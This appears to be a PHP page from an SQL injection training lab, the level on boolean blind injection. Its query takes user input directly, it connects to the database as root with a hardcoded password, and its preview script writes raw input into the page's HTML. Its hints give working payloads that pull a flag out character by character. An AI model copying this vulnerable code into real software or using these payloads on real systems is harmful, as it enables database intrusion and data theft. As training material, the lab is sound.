<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 4 - Boolean Blind SQLi</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Level 4 - Boolean Blind Injection</h1>
            <p><strong>Objective:</strong> Extract data by observing True/False responses when no direct output is available</p>
        </div>

        <div class="form-container">
            <h3>🔍 Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE username = '<?php echo htmlspecialchars($_GET['cond'] ?? 'NULL'); ?>'</div>
            
            <?php
            if (isset($_GET['cond'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                $cond = $_GET['cond'];
                $sql = "SELECT username FROM users WHERE username = '$cond'";
                $res = $mysqli->query($sql);
                if ($res && $res->num_rows > 0) {
                    echo '<strong style="color: #28a745;">✅ True</strong> - Query returned results';
                } else {
                    echo '<strong style="color: #dc3545;">❌ False</strong> - Query returned no results';
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="cond">Username Condition:</label>
                    <input type="text" id="cond" name="cond" value="<?php echo htmlspecialchars($_GET['cond'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Boolean Blind</h4>
                    <p><strong>🎯 Concept:</strong> Boolean Blind SQLi relies on True/False responses</p>
                    <p><strong>📝 How it works:</strong> No direct data, only "has results" or "no results"</p>
                    <p><strong>🧪 Test:</strong> <code>alice</code> (existing username) - will return True</p>
                    <p><strong>🔍 Result:</strong> ✅ True - Query returned results</p>
                    <p><strong>💡 Next step:</strong> Try non-existent username to see False response</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Breaking Query with Conditions</h4>
                    <p><strong>🎯 Goal:</strong> Use AND/OR to add conditions</p>
                    <p><strong>📝 Test:</strong> <code>alice' AND 1=1--</code></p>
                    <p><strong>🔍 Explanation:</strong></p>
                    <p>• <code>alice'</code> - End username string</p>
                    <p>• <code>AND 1=1</code> - Always true condition</p>
                    <p>• <code>--</code> - Comment rest of query</p>
                    <p><strong>🎯 Expected Result:</strong> ✅ True (alice exists AND 1=1 is true)</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Check Table Existence</h4>
                    <p><strong>🎯 Goal:</strong> Confirm levels table exists</p>
                    <p><strong>📝 Test:</strong> <code>alice' AND (SELECT COUNT(*) FROM levels)>0--</code></p>
                    <p><strong>🔍 Explanation:</strong></p>
                    <p>• <code>(SELECT COUNT(*) FROM levels)</code> - Count rows in levels table</p>
                    <p>• <code>>0</code> - Check if at least 1 row exists</p>
                    <p><strong>🎯 Result:</strong> ✅ True if levels table exists and has data</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Extract Character by Character</h4>
                    <p><strong>🎯 Goal:</strong> Use SUBSTRING to get individual characters</p>
                    <p><strong>📝 Test:</strong> <code>alice' AND SUBSTRING((SELECT flag FROM levels WHERE id=4),1,1)='F'--</code></p>
                    <p><strong>🔍 Explanation:</strong></p>
                    <p>• <code>SUBSTRING(...,1,1)</code> - Get first character</p>
                    <p>• <code>(SELECT flag FROM levels WHERE id=4)</code> - Get level 4 flag</p>
                    <p>• <code>='F'</code> - Check if first character is 'F'</p>
                    <p><strong>💡 Method:</strong> Try each character A-Z, 0-9 until you find it!</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 5: FINAL PAYLOAD</h4>
                    <p><strong>🚀 Method 1 - Check if flag exists:</strong></p>
                    <p><code>alice' AND (SELECT COUNT(*) FROM levels WHERE id=4)>0--</code></p>
                    <p><strong>🚀 Method 2 - Check flag length:</strong></p>
                    <p><code>alice' AND LENGTH((SELECT flag FROM levels WHERE id=4))>20--</code></p>
                    <p><strong>🚀 Method 3 - Check first character:</strong></p>
                    <p><code>alice' AND ASCII(SUBSTRING((SELECT flag FROM levels WHERE id=4),1,1))=70--</code></p>
                    <p><strong>🚀 Method 4 - Direct flag comparison (if you know it):</strong></p>
                    <p><code>alice' AND (SELECT flag FROM levels WHERE id=4) LIKE 'FLAG{%'--</code></p>
                    <p><strong>📋 Character extraction process:</strong></p>
                    <p>• Use ASCII() function to get character codes (A=65, F=70, etc.)</p>
                    <p>• Extract each position: SUBSTRING(text, position, length)</p>
                    <p>• Build the flag character by character until complete</p>
                    <p><strong>🏆 Pro tip:</strong> Start with common flag patterns like 'FLAG{' or 'CTF{'</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level3.php">⬅️ Previous Level</a>
            <a href="level5.php">➡️ Next Level</a>
            <a href="submit.php?level=4">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('cond').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = "SELECT username FROM users WHERE username = '" + (input || 'NULL') + "'";
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>